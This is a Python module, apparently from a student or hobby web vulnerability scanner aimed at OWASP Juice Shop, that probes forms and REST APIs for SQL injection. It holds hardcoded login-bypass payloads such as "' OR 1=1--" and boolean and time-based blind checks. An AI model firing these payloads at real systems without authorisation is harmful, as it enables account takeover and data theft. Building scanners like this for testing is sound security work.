import time
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
import requests
import json

from scanner_core.scanner import Vulnerability
from .base_tester import BaseTester


class SqliTester(BaseTester):
    def __init__(self, session: requests.Session, config: dict):
        super().__init__(session, config)
        self.error_payloads = self.config.get('error_based_payloads', [])
        self.time_payloads = self.config.get('time_based_payloads', [])
        self.boolean_payloads = self.config.get('boolean_based_payloads', [])
        self.error_patterns = self.config.get('error_patterns', [])
        self.time_delay_threshold = self.config.get('time_delay_seconds', 4)

    # ... (Hàm test(self, url) cho GET request GIỮ NGUYÊN như cũ) ...
    def test(self, url: str) -> Optional[Vulnerability]:
        pass  # Vui lòng giữ nguyên code hàm test() cũ của bạn ở đây để không làm dài bài viết

    def test_form(self, form_data: dict) -> Optional[Vulnerability]:
        """Kiểm tra SQLi chuyên sâu cho POST/PUT Forms & REST APIs"""
        url = form_data['url']
        method = form_data.get('method', 'POST').upper()
        inputs = form_data.get('inputs', [])
        is_api = form_data.get('is_api', False)

        if not inputs: return None

        # 1. TẠO BASELINE (Gửi data bình thường để xem server phản ứng chuẩn thế nào)
        base_resp = self._inject_form_payload(url, method, inputs, None, None, is_api)
        if not base_resp: return None
        base_status = base_resp.status_code
        base_len = len(base_resp.content)

        for target_input in inputs:
            param = target_input['name']

            # ====================================================================
            # KỸ THUẬT 1: API AUTHENTICATION BYPASS (Chuyên trị Juice Shop Login)
            # ====================================================================
            if method == 'POST':
                # Các payload kinh điển để vượt qua vòng kiểm tra user/pass
                auth_bypass_payloads = ["' OR 1=1--", "' OR '1'='1", "admin@juice-sh.op'--", "' OR true--", "admin' #"]
                for payload in auth_bypass_payloads:
                    try:
                        resp = self._inject_form_payload(url, method, inputs, param, payload, is_api)
                        if not resp: continue

                        # LOGIC: Nếu bình thường API trả về 401/403/404 (Failed),
                        # nhưng khi tiêm payload lại trả về 200/201 (Success) -> BYPASS THÀNH CÔNG!
                        if resp.status_code in [200, 201] and base_status in [401, 403, 404, 500]:
                            return Vulnerability(
                                type='SQL Injection', subcategory='Authentication Bypass (REST API)', url=url,
                                details={
                                    'parameter': param, 'payload': payload,
                                    'evidence': f'Status code changed from {base_status} (Denied) to {resp.status_code} (Success) using payload.'
                                },
                                severity='Critical'
                            )

                        # LOGIC DỰ PHÒNG: Nếu API luôn trả 200, nhưng data trả về chứa Token
                        if resp.status_code == 200 and any(
                                k in resp.text.lower() for k in ['token', 'session', 'authentication']):
                            # Gửi payload sai để xác minh
                            bad_resp = self._inject_form_payload(url, method, inputs, param, "' AND 1=2--", is_api)
                            if bad_resp and (bad_resp.status_code >= 400 or 'error' in bad_resp.text.lower()):
                                return Vulnerability(
                                    type='SQL Injection', subcategory='Authentication Bypass (Token Issue)', url=url,
                                    details={'parameter': param, 'payload': payload,
                                             'evidence': 'Server issued an auth token upon payload injection.'},
                                    severity='Critical'
                                )
                    except Exception:
                        pass

            # ====================================================================
            # KỸ THUẬT 2: BOOLEAN-BASED BLIND (So sánh Data Length & Status Code)
            # ====================================================================
            for payload_pair in self.boolean_payloads:
                true_payload = payload_pair.get('true')
                false_payload = payload_pair.get('false')

                try:
                    resp_true = self._inject_form_payload(url, method, inputs, param, true_payload, is_api)
                    resp_false = self._inject_form_payload(url, method, inputs, param, false_payload, is_api)

                    if resp_true and resp_false:
                        # Cách 1: Khác biệt về Status Code (VD: True -> 200, False -> 500)
                        if resp_true.status_code == 200 and resp_false.status_code >= 400:
                            return Vulnerability(
                                type='SQL Injection', subcategory=f'Boolean-Based ({method})', url=url,
                                details={'parameter': param, 'true_payload': true_payload,
                                         'evidence': f'TRUE logic returns {resp_true.status_code}, FALSE logic returns {resp_false.status_code}.'},
                                severity='Critical'
                            )

                        # Cách 2: Khác biệt về kích thước Dữ liệu (VD: True trả về 50 items, False trả về 0 items)
                        # Rất hiệu quả cho API Search của Juice Shop
                        len_true = len(resp_true.content)
                        len_false = len(resp_false.content)
                        if abs(len_true - len_false) > 50 and abs(len_true - base_len) < 50:
                            return Vulnerability(
                                type='SQL Injection', subcategory=f'Boolean-Based Data ({method})', url=url,
                                details={'parameter': param, 'true_payload': true_payload,
                                         'evidence': f'Response size differs significantly: TRUE({len_true} bytes) vs FALSE({len_false} bytes).'},
                                severity='High'
                            )
                except Exception:
                    pass

            # ====================================================================
            # KỸ THUẬT 3: TIME-BASED BLIND (Dành cho Form ẩn / Không trả kết quả)
            # ====================================================================
            for payload in self.time_payloads:
                try:
                    start_t = time.time()
                    self._inject_form_payload(url, method, inputs, param, payload, is_api)
                    if (time.time() - start_t) > self.time_delay_threshold:
                        return Vulnerability(
                            type='SQL Injection', subcategory=f'Time-Based ({method})', url=url,
                            details={'parameter': param, 'payload': payload,
                                     'evidence': 'Server response was significantly delayed.'}, severity='Critical'
                        )
                except Exception:
                    pass

        return None

    def _inject_form_payload(self, url, method, inputs, target_param, payload, is_api):
        """Hàm gửi Data chuẩn xác nhất cho cả Web cũ và API mới"""
        data = {}
        for inp in inputs:
            val = payload if inp['name'] == target_param else inp.get('value', '1')
            data[inp['name']] = val

        headers = {
            'ngrok-skip-browser-warning': 'true',
            'User-Agent': 'Mozilla/5.0 Scanner'
        }

        try:
            if method == 'GET':
                return self.session.get(url, params=data, timeout=10, verify=False, headers=headers)

            # Gửi JSON chuẩn nếu là API
            if is_api or 'api' in url.lower():
                headers['Content-Type'] = 'application/json'
                headers['Accept'] = 'application/json'
                if method == 'PUT':
                    return self.session.put(url, json=data, timeout=10, verify=False, headers=headers)
                return self.session.post(url, json=data, timeout=10, verify=False, headers=headers)
            else:
                # Gửi Form-URL-Encoded chuẩn
                return self.session.post(url, data=data, timeout=10, verify=False, headers=headers)
        except Exception:
            return None